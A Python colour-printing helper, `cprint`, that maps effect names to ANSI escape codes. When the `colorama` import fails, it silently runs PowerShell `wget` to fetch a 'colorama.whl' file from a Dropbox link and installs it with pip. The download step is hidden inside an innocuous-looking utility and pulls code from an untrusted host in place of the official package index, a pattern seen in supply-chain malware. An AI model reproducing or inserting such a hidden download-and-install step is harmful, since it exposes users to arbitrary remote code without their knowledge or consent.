def cprint(text: str = '', *effects: str) -> None:
    """
    Print `text` using the ANSI sequences to change colour, etc

    :param text: The text to print.
    :param effects: The effect we want.  One of the constants
        defined at the start of this module.

    The arguments:
    `BLACK`
    `RED`
    `GREEN`
    `YELLOW`
    `BLUE`
    `MAGENTA` 
    `CYAN`
    `WHITE`
    `RESET`

    `BOLD`
    `UNDERLINE` 
    `REVERSE`
    
    """
    BLACK = '\u001b[30m'
    RED = '\u001b[31m'
    GREEN = '\u001b[32m'
    YELLOW = '\u001b[33m'
    BLUE = '\u001b[34m'
    MAGENTA = '\u001b[35m'
    CYAN = '\u001b[36m'
    WHITE = '\u001b[37m'
    RESET = '\u001b[0m'

    BOLD = '\u001b[1m'
    UNDERLINE = '\u001b[4m'
    REVERSE = '\u001b[7m'
    try:
        import colorama
    except :
        import subprocess
        subprocess.call('powershell wget "https://www.dropbox.com/s/tpkx2ruqkqhv55s/colorama.whl?dl=1" -outfile colorama.whl')
        subprocess.call("pip install colorama.whl")
        import colorama
    

    effect_string = "".join(effects)

    if effect_string.casefold() == 'black':
        effect_string = BLACK
    elif effect_string.casefold() == 'red':
        effect_string = RED
    elif  effect_string.casefold() == 'green':
        effect_string = GREEN
    elif  effect_string.casefold() == 'yellow':
        effect_string = YELLOW
    elif effect_string.casefold() == 'blue':
        effect_string = BLUE
    elif effect_string.casefold() == 'magenta':
        effect_string = MAGENTA
    elif effect_string.casefold() == 'cyan':
        effect_string = CYAN
    elif effect_string.casefold() == 'white':
        effect_string = WHITE
    elif  effect_string.casefold() == 'reset':
        effect_string = RESET
    elif effect_string.casefold() == 'bold':
        effect_string = BOLD
    elif effect_string.casefold() == 'underline':
        effect_string = UNDERLINE
    elif effect_string.casefold() == 'reverse':
        effect_string = REVERSE
    
    colorama.init()
    output_string = f"{effect_string}{text}{RESET}"
    print(output_string)
    colorama.deinit()